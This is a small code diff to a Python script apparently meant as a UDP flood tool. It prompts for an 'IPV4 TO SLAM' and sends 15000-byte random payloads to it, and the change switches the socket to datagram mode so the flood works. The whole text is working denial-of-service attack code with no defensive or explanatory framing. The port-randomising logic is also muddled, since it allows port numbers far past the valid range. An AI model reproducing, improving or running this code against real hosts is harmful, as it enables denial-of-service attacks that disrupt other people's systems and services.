@@ -5,7 +5,7 @@ def FLOOD():
     ip = input("IPV4 TO SLAM: ")
     port = 80
     randport=(True,False)[port==0]
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     bytes=random._urandom(15000)
     port=(random.randint(1,15000000),port)[randport]
     s.sendto(bytes,(ip,port))
